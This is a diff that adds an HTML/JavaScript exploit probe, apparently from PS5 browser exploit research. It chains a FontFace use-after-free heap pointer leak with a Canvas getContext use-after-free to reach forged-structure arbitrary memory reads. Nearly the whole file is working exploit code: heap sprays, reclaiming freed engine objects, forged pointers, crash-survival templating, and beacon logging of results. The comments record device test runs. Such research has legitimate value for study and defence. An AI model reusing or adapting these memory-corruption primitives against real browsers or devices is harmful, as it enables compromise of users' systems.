@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V675</title></head>
+<body><pre id="out">V675 — FontFace heap leak (p563) x Canvas UAF chain (V573/V650) cross-repo combo</pre>
+<script>
+'use strict';
+/*
+ * V675 v3 — CROSS-REPO COMBO PROBE
+ *
+ * Combines two independently device-confirmed halves of the 14.10 chain:
+ *   F: FontFaceSet UAF heap leak (PS5-14.10-Research p563, issue #155) --
+ *      192B ArrayBuffer reclaims freed CSSFontFace; engine writes two live
+ *      heap pointers at +0x58 (HashTable*) and +0x68 (WeakPtrImpl*).
+ *   C: Canvas getContext() reentrant UAF (CVE-2026-43720, this repo V573) --
+ *      same-type reclaim gives full typed R/W through the stale wrapper.
+ *   X: Forged stateStack read (this repo V650) -- AB(768) reclaims the freed
+ *      768B ctx slot; forged m_stateStack.m_buffer makes a stale-wrapper
+ *      lineWidth read dereference TARGET+48. Here TARGET = leaked T/W.
+ *
+ * DEVICE HISTORY ON THIS BENCH (53 runs, 2026-11-12):
+ *   - Leak landed 3/53 (T=0x10008b2810 / 0x100088c9c0 / 0x10008849c0);
+ *     Canvas alias succeeded 11/11 completed runs.
+ *   - X crashed 3/3 immediately after X-ARMED at T, i.e. AFTER phase C's
+ *     spray: matches repo 2's STALE TABLE LAW (+0x58 valid same-cycle,
+ *     dies between rounds). v3 therefore runs X IMMEDIATELY after the
+ *     leak scan, BEFORE any canvas churn (repo 2's V102 same-cycle recipe).
+ *   - Many runs died in the font phase before any scan: consistent with
+ *     repo 1's Timer RELEASE_ASSERT blocker on some reclaim patterns.
+ *   - The guide's crash-auto-retry loop then cycled every ~1.2s and the
+ *     console hit "not enough free system memory". v3 adds a crash-loop
+ *     breaker: 5 consecutive crashed runs within 2 minutes -> HALT page
+ *     (no allocations, no trigger) until ?reset=1 or a >2min pause.
+ *
+ * METHODOLOGY NOTE (corrects sibling-repo p658): scanning sprayed ABs for
+ * pre-free marker doubles cannot detect reclaim -- ArrayBuffer allocation
+ * zero-fills, so freed contents never survive into a reclaimed AB. The only
+ * sound reclaim test is engine-action-through-the-AB (V650 pattern).
+ *
+ * CRASH_CLASS: HIGH. All beacons are synchronous XHR POSTs so every phase's
+ * results reach host-beacons.log before any later crash.
+ *
+ * Params: ?x=0       no X phase (safe: F + C only)
+ *         ?xtgt=t|w  pin X target (default: alternates t on odd runs, w on even)
+ *         ?neg=1     X negative control at a certainly-unmapped VA (expect crash)
+ *         ?spray=N   same-type spray count   (default 150; p636 measured 100%)
+ *         ?saves=N   saves inside getter #1  (default 8, V573 param)
+ *         ?xn=N      X AB(768) spray count   (default 200, V650 param)
+ *         ?reset=1   clear crash/session markers (also un-HALT)
+ *
+ * Verdict beacons: FONT-LEAK-OK / FONT-ALL-CLEAN / FONT-NOFIRE,
+ *   X-ARMED / X-READ / X-CONFIRMED (X FIRST on leak runs), C-* / ALIAS,
+ *   X-SKIP-NOLEAK, X-PREV-CRASH, DONE, HALT.
+ */
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST','/beacon/V675-'+encodeURIComponent(tag)+'?t='+Date.now(),false);
+    x.send(String(d==null?'':d).slice(0,700));
+  }catch(e){}
+}
+window.onerror=function(m){bk('ERR',String(m).slice(0,200));};
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _bu;try{_bu=new BigUint64Array(_b8);}catch(e){}
+function f2h(v){_f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+function h32(v){return('00000000'+((v>>>0).toString(16))).slice(-8);}
+function qHex(hi,lo){return '0x'+h32(hi)+h32(lo);}
+function hexB(v){return('0'+v.toString(16)).slice(-2);}
+
+var P=new URLSearchParams(location.search);
+var DOX=P.get('x')!=='0';
+var NEG=P.get('neg')==='1';
+var NSPRAY=+(P.get('spray')||'150');
+var NSAVES=+(P.get('saves')||'8');
+var XN=+(P.get('xn')||'200');
+
+/* reset escape hatch */
+if(P.get('reset')==='1'){
+  try{
+    localStorage.removeItem('v675sess');
+    localStorage.removeItem('v675done');
+    localStorage.removeItem('v675run');
+    localStorage.removeItem('v675x');
+  }catch(e){}
+}
+
+/* run counter: fresh @font-face family names per attempt */
+var RUN=1;
+try{RUN=(parseInt(localStorage.getItem('v675run'),10)||0)+1;}catch(e){}
+try{localStorage.setItem('v675run',String(RUN));}catch(e){}
+var FAM_F='f0-'+RUN,FAM_S='s0-'+RUN;
+
+/* X target: explicit ?xtgt= wins; otherwise alternate t/w per run so every
+ * crash-retry cycle covers both leaked pointers automatically */
+var XTGT_PARAM=P.get('xtgt');
+var XTGT_EFF=XTGT_PARAM?((XTGT_PARAM==='w')?'w':'t'):((RUN%2===0)?'w':'t');
+
+/* crash-loop breaker: count consecutive BOOTs with no DONE since last boot */
+var HALT=false,sess={c:0,t:0},doneTs=0;
+try{var sj=JSON.parse(localStorage.getItem('v675sess')||'null');if(sj&&typeof sj.c==='number')sess=sj;}catch(e){}
+try{doneTs=+(localStorage.getItem('v675done')||0);}catch(e){}
+var nowBoot=Date.now();
+if(sess.t===0)sess.c=0;
+else if(sess.t>doneTs)sess.c++;
+else sess.c=0;
+/* HALT is genuinely time-boxed: sess.t only advances on boots that actually
+ * RUN, so the 120s penalty expires even across retries. (v3 advanced sess.t
+ * on HALTed boots too, which made HALT permanent while retrying.) */
+if(sess.c>=5&&(nowBoot-sess.t)<120000)HALT=true;
+if(!HALT){sess.t=nowBoot;try{localStorage.setItem('v675sess',JSON.stringify(sess));}catch(e){}}
+
+bk('BOOT','x='+DOX+',xtgt_eff='+XTGT_EFF+',neg='+NEG+',spray='+NSPRAY+',saves='+NSAVES+',xn='+XN+',run='+RUN+',crashes='+sess.c+(HALT?',HALT':''));
+say('BOOT x='+DOX+' xtgt_eff='+XTGT_EFF+' neg='+NEG+' spray='+NSPRAY+' saves='+NSAVES+' run='+RUN+' crashes='+sess.c);
+
+/* ============================================================
+ * PHASE F — FontFace heap pointer leak (exact p563 flow)
+ * ============================================================ */
+var FONT_SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var FONT_K=8;
+var fontMap=null,fontFired=false,fontScans=0,fontDone=false;
+var T58={hi:0,lo:0},W68={hi:0,lo:0},fontLeak=false;
+
+function fontSetup(){
+  var A=new FontFace(FAM_F,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+  window.__keep=[A];
+  var styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: "+FAM_S+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  fontFired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fontFired)return undefined;
+      fontFired=true;
+      styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      fontMap=[];
+      for(var si=0;si<FONT_SIZES.length;si++){
+        var size=FONT_SIZES[si];
+        for(var k=0;k<FONT_K;k++){
+          var ab=new ArrayBuffer(size);
+          var ent={size:size,view:new Uint8Array(ab)};
+          if(size===192)ent.dv=new DataView(ab);
+          fontMap.push(ent);
+        }
+      }
+      try{document.fonts.check('1em '+FAM_S);}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+  bk('FONT-LOAD-CALLED','');
+  document.fonts.load('1em '+FAM_F+', '+FAM_S,'AB').then(function(){bk('FONT-RESOLVED','');},
+                                                   function(){bk('FONT-REJECTED','');});
+  setTimeout(fontScan,60);
+  setTimeout(fontScan,400);
+  setTimeout(function(){if(!fontDone){bk('FONT-NOFIRE','fired='+fontFired);fontFinish();}},1500);
+}
+
+function fontScan(){
+  if(fontDone||!fontMap||!fontMap.length)return;
+  fontScans++;
+  var out=[];
+  for(var i=0;i<fontMap.length;i++){
+    var v=fontMap[i].view,n=0,first=-1;
+    for(var j=0;j<v.length;j++)if(v[j]!==0){n++;if(first<0)first=j;}
+    if(n){
+      var s='',stop=Math.min(v.length,first+256);
+      for(var j2=first;j2<stop;j2++)s+=hexB(v[j2]);
+      out.push('b'+i+'-s'+fontMap[i].size+'-o'+first+'-n'+n+'-'+s);
+      if(fontMap[i].size===192){
+        var dv=fontMap[i].dv;
+        T58.hi=dv.getUint32(0x5C,true);T58.lo=dv.getUint32(0x58,true);
+        W68.hi=dv.getUint32(0x6C,true);W68.lo=dv.getUint32(0x68,true);
+        if(T58.hi>0||W68.hi>0)fontLeak=true;
+      }
+    }
+  }
+  if(!out.length){
+    if(fontScans>=2){bk('FONT-ALL-CLEAN',String(fontMap.length));fontFinish();}
+    return;
+  }
+  bk('FONT-HIT',out.join('_').slice(0,700));
+  bk('FONT-T58',qHex(T58.hi,T58.lo));
+  bk('FONT-W68',qHex(W68.hi,W68.lo));
+  bk(fontLeak?'FONT-LEAK-OK':'FONT-HIT-NOENG','');
+  try{localStorage.setItem('v675leak',JSON.stringify({t:qHex(T58.hi,T58.lo),w:qHex(W68.hi,W68.lo),run:RUN}));}catch(e){}
+  /* p564 BUFFER TEMPLATING (survival trick, repo 2): after reading the
+   * leaked pointers, template ALL 192B buffers with the engine's own
+   * pointers (rc=1, +0x58, +0x68). Otherwise the engine's continued use
+   * of the stale CSSFontFace crashes the process -- this is what killed
+   * most font-phase runs before v4. p564 confirmed: with templating the
+   * page SURVIVES (P564-S2-RESOLVED / P564-S2-ALIVE-1). */
+  for(var ti=0;ti<fontMap.length;ti++){
+    if(fontMap[ti].size!==192)continue;
+    var bv=fontMap[ti].view;
+    bv[0]=1;bv[1]=0;bv[2]=0;bv[3]=0;
+    bv[4]=0;bv[5]=0;bv[6]=0;bv[7]=0;
+    var tdv=fontMap[ti].dv;
+    tdv.setUint32(0x58,T58.lo,true);
+    tdv.setUint32(0x5C,T58.hi,true);
+    tdv.setUint32(0x68,W68.lo,true);
+    tdv.setUint32(0x6C,W68.hi,true);
+  }
+  bk('FONT-TEMPLATE','192B x8 rc=1 +0x58/+0x68 restored');
+  fontFinish();
+}
+
+function fontFinish(){
+  if(fontDone)return;
+  fontDone=true;
+  try{delete FontFace.prototype.then;}catch(e){}
+  say('FONT: leak='+(fontLeak?'OK '+qHex(T58.hi,T58.lo)+' / '+qHex(W68.hi,W68.lo):'MISS'));
+  /* STALE TABLE LAW: consume the leak immediately, before canvas churn.
+   * On a leak with X armed, phase X runs FIRST; phase C follows on success. */
+  if(NEG){phaseX();return;}
+  if(fontLeak&&DOX){phaseX();return;}
+  phaseC();
+}
+
+/* ============================================================
+ * PHASE C — Canvas UAF #1 + same-type reclaim (V573 port)
+ * ============================================================ */
+var inner1=null,xCompleted=false;
+
+function phaseC(){
+  bk('C-START','');
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    inner1=c.getContext('2d');
+    for(var s=0;s<NSAVES;s++)inner1.save();
+    inner1.lineWidth=1.0;
+    return true;
+  }});
+  c.getContext('bitmaprenderer',d);
+  bk('C-UAF','inner='+(inner1?'OK':'NULL'));
+
+  var sprayCanvases=[],sprayCtxs=[];
+  for(var i=0;i<NSPRAY;i++){
+    var sc=document.createElement('canvas');
+    sc.width=1;sc.height=1;
+    var sctx=sc.getContext('2d');
+    if(sctx){
+      sctx.lineWidth=7777.77;
+      sprayCanvases.push(sc);
+      sprayCtxs.push(sctx);
+    }
+  }
+  bk('C-SPRAY','n='+sprayCtxs.length);
+  window.__sprayC=sprayCanvases;
+  window.__sprayX=sprayCtxs;
+
+  var lw,ml,ga,err='';
+  try{lw=inner1.lineWidth;}catch(e){err+='lw:'+(e&&e.message);}
+  try{ml=inner1.miterLimit;}catch(e){err+='ml:'+(e&&e.message);}
+  try{ga=inner1.globalAlpha;}catch(e){err+='ga:'+(e&&e.message);}
+  if(err){bk('C-READ-ERR',err.slice(0,120));say('C: read err');finishC();return;}
+
+  bk('C-READ','lw='+lw+' raw='+f2h(lw)+' ml='+ml+' ga='+ga);
+  say('C: lw='+lw+' ('+f2h(lw)+')');
+
+  if(lw===7777.77){
+    bk('RECLAIM','CONFIRMED');
+    inner1.lineWidth=9999.99;
+    var ok=(inner1.lineWidth===9999.99);
+    bk('WRITE','ok='+ok);
+    for(var j=0;j<sprayCtxs.length;j++){
+      if(sprayCtxs[j].lineWidth===9999.99){bk('ALIAS','idx='+j);break;}
+    }
+  }else{
+    bk('C-NO-RECLAIM','lw='+lw);
+  }
+  try{var dash=inner1.getLineDash();bk('C-DASH','len='+dash.length);}catch(e){bk('C-DASH','ERR');}
+  try{bk('C-FILL','v='+String(inner1.fillStyle).slice(0,40));}catch(e){bk('C-FILL','ERR');}
+  finishC();
+}
+
+function finishC(){
+  if(xCompleted){finish('x-complete');}
+  else if(!fontLeak){bk('X-SKIP-NOLEAK','');finish('no-leak');}
+  else{bk('X-OFF','');finish('x-off');}
+}
+
+/* release everything at DONE so soft reloads of the User's Guide (same
+ * WebProcess) do not accumulate sprays across runs -> OOM. */
+function release(){
+  try{
+    if(fontMap)fontMap.length=0;
+    if(window.__sprayC)window.__sprayC.length=0;
+    if(window.__sprayX)window.__sprayX.length=0;
+    if(window.__xab)window.__xab.length=0;
+    if(window.__xdv)window.__xdv.length=0;
+    window.__keep=null;
+    inner1=null;
+  }catch(e){}
+}
+function finish(m){
+  release();
+  try{localStorage.setItem('v675done',String(Date.now()));}catch(e){}
+  bk('DONE',m);
+}
+
+/* ============================================================
+ * PHASE X — targeted read: V650 oracle aimed at FontFace T/W
+ * ============================================================ */
+function sub48(hi,lo){
+  if(lo>=48)return{hi:hi,lo:lo-48};
+  return{hi:hi-1,lo:lo-48+4294967296};
+}
+
+function phaseX(){
+  if(NEG){
+    bk('X-NEG-ARMED','expect crash');
+    xFire({hi:0x00003000,lo:0x00000000},'neg');
+    return;
+  }
+  if(!fontLeak){bk('X-SKIP-NOLEAK','');phaseC();return;}
+  if(!DOX){phaseC();return;}
+  var tgt=(XTGT_EFF==='w')?W68:T58;
+  if(tgt.hi===0&&tgt.lo===0)tgt=(XTGT_EFF==='w')?T58:W68;
+  if(tgt.hi===0&&tgt.lo===0){bk('X-SKIP-NOLEAK','both-zero');phaseC();return;}
+  var prev=null;
+  try{prev=localStorage.getItem('v675x');}catch(e){}
+  if(prev){bk('X-PREV-CRASH',prev.slice(0,80));try{localStorage.removeItem('v675x');}catch(e){}}
+  try{localStorage.setItem('v675x','armed-'+Date.now()+'-'+XTGT_EFF);}catch(e){}
+  xFire(tgt,XTGT_EFF);
+}
+
+function xFire(tgt,desc){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var inner2=null;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    inner2=c.getContext('2d');
+    return true;
+  }});
+  c.getContext('bitmaprenderer',d);
+  bk('X-UAF','inner='+(inner2?'OK':'NULL'));
+  if(!inner2){bk('X-FAIL','no-inner');finish('x-fail');return;}
+
+  for(var f=0;f<600;f++){var tmp=new ArrayBuffer(16);}
+  window.__xt=tmp;
+
+  var XN2=XN,xabs=[],xdvs=[];
+  for(var s=0;s<XN2;s++){
+    var ab=new ArrayBuffer(768);
+    xabs.push(ab);
+    xdvs.push(new DataView(ab));
+  }
+  window.__xab=xabs;
+  window.__xdv=xdvs;
+  bk('X-SPRAY','n='+XN2);
+
+  var rd=sub48(tgt.hi,tgt.lo);
+  var readAddr=qHex(tgt.hi,tgt.lo);
+  var bufAddr=qHex(rd.hi,rd.lo);
+  bk('X-ARMED','read@'+readAddr+' buffer='+bufAddr+' ('+desc+')');
+  say('X: armed read@'+readAddr);
+
+  for(var w=0;w<xdvs.length;w++){
+    var dv=xdvs[w];
+    dv.setUint32(112,rd.lo,true);
+    dv.setUint32(116,rd.hi,true);
+    dv.setUint32(120,1,true);
+    dv.setUint32(124,1,true);
+  }
+
+  var v=null,fill=null;
+  try{v=inner2.lineWidth;}catch(e){bk('X-READ','THROW:'+String(e).slice(0,80));}
+  if(v!==null){
+    var hexv=f2h(v);
+    var big=_bu?('0x'+_bu[0].toString(16)):hexv;
+    bk('X-READ','read@'+readAddr+' lw='+v+' hex='+hexv+' big='+big);
+    try{fill=String(inner2.fillStyle);bk('X-FILL','v='+fill.slice(0,40));}catch(e){bk('X-FILL','ERR');}
+    bk('X-CONFIRMED','targeted-read-ok read@'+readAddr+' lw='+v+' big='+big);
+    say('X: CONFIRMED read@'+readAddr+' -> '+big);
+    xCompleted=true;
+  }
+
+  inner2=null;
+  for(var c2=0;c2<xdvs.length;c2++){
+    xdvs[c2].setFloat64(112,0,true);
+    xdvs[c2].setUint32(120,0,true);
+    xdvs[c2].setUint32(124,0,true);
+  }
+  try{localStorage.removeItem('v675x');}catch(e){}
+  if(xCompleted){phaseC();}else{finish('x-incomplete');}
+}
+
+/* ============================================================
+ * RUN (after all declarations are initialized)
+ * ============================================================ */
+if(HALT){
+  bk('HALT','crash-loop-breaker after '+sess.c+' crashed runs');
+  say('HALT: '+sess.c+' consecutive crashed runs.');
+  say('Restart the console, or open with ?reset=1 to clear.');
+}else{
+  fontSetup();
+  setTimeout(function(){bk('ALIVE-5s','');},5000);
+  setTimeout(function(){bk('ALIVE-10s','');},10000);
+}
+</script>
+</body>
+</html>
